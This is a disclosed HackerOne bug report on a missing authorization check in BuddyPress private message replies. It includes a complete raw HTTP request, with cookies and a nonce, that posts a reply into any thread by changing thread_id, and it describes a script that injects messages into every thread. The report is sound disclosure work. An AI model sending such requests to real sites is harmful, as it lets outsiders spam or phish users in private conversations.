# Mssing Authorization on Private Message replies (BuddyPress)

## Report Details
- **Report ID**: 490782
- **URL**: https://hackerone.com/reports/490782
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-02-03T20:07:05.875Z
- **Disclosed**: 2019-03-08T22:27:35.566Z

## Reporter
- **Username**: klmunday
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
## Description:
Users can reply to private message threads which they are not participants of by changing the `thread_id` parameter in the `messages_send_reply` ajax action. This affects both the Legacy and Nouveau Template packs.

## Steps To Reproduce:
1. Login to your account
2. Send the following request (change `Host`/`Cookie`/`nonce`/`thread_id` as needed)

>POST /wp-admin/admin-ajax.php HTTP/1.1
>Host: 127.0.0.1
>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
>Accept: */*
>Accept-Language: en-GB,en;q=0.5
>Accept-Encoding: gzip, deflate
>Referer: http://127.0.0.1/members/test2/messages/view/4/
>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
>X-Requested-With: XMLHttpRequest
>Content-Length: 76
>Connection: close
>Cookie: >wordpress_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7C64fbdf07238d2f448b8e53f6f1db7c64b014d7833386229505fefa70c9b2976e; wordpress_test_cookie=WP+Cookie+check; >wordpress_logged_in_ab0994624b8d5b17fddb1aec29329218=test2%7C1549395197%7ClRQfd96VkhuRpR4fpB3MhZOw2SGrl19nFG7wIClGYaf%7Ca309bfd19a1c2e4504e37959bd4ceac28944fce81857c2f7587022a4e6d2b7aa

>action=messages_send_reply&cookie=&_wpnonce=d037f67211&content=Test+Message&thread_id=1

## Notes:
Even though an attacker can send a reply to a thread, they cannot view the thread afterwards. The reply they send does not appear in the attackers sentbox (see image below)
{F417446}
Nor do any future replies appear in the attackers inbox, nor is the attacker able to star the reply. This means that there is no information exposure.

When participants view the thread they will see the attackers reply, however the attacker does not appear in the participants list (see images below)

__Inbox:__
{F417451}
__View:__
{F417444}

## Proof of Concept:
I have developed a small Python (3.6+) script to inject a message into every private message thread. It achieves this by creating a new conversation between the attacker and himself to get the current private message max index and then iterates from 1 -> max index, posting a message into each thread.
{F417456}
It will try to reply to threads that may have been deleted but since thread_id's are sequential, if every thread from 1 to the thread the attacker created is replied to then we can be sure that every thread that exists when the script is ran has been injected into.

## Impact

Just by itself this can only really lead to spam / phishing attacks. However, if the component is vulnerable to other flaws such as #487081 (not public) then it can widen an attack surface and becomes a more serious issue.

## Attachments
- message-thread-injection-injected-thread.png
- message-thread-injection-not-in-sent.png
- message-thread-injection-shows-in-inbox.png
- inject_messages.py
